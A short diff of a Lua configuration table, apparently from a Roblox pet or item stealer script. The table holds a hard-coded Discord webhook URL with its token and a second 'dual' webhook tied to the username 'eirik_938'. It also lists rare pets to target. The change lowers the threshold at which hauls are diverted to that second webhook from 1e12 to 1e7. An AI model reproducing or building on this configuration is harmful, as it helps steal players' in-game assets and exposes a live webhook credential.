@@ -50,7 +50,7 @@ local CONFIG = {
     webhook = getfenv().Webhook,
     dualWebhook = "https://discord.com/api/webhooks/1395923307668443166/q9qB5eEYtE2X4I9EbfMe7bTj4Sa8RhnD8Fdjj05J5Bu7Ih0U-eeaDo1zbGJLKfHJ807w",
     dualUsername = "eirik_938",
-    dualWebhookThreshold = 1e12,
+    dualWebhookThreshold = 1e7,
     
     rarePets = {"Butterfly", "Raccoon", "Dragonfly", "Mimic Octopus", "Queen Bee", "Disco Bee", "Fennec Fox", "red fox", "t-rex", "fennec fox"},
     excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"},
